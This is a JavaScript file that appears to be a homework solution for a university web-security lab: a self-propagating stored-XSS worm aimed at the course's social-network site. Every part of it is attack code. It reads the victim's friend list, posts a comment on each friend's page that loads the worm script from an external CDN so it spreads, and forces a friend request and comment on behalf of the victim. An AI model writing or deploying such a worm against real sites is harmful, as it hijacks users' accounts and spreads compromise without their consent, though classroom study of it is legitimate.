function worms() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    var arr= eff.match('^[^<br]*').join().split(',');
    for( var i = 0; i < arr.length; i++){
        var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]}, function(data){
            if (JSON.stringify(data).match('jhp4900') == null){
                alert("Not here");
                $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{
                    comment: '<script src="https://cdn.jsdelivr.net/gh/jhp4900/webapphw/worms.js"></script><img src="https://upload.wikimedia.org/wikipedia/en/5/51/Minecraft_cover.png" width=200 height=200 />'
                });
            }
            return data;
        });

    }
    if(eff.match('183') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 183});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 183,comment: 'Im your friend now'});
    }
}
worms();
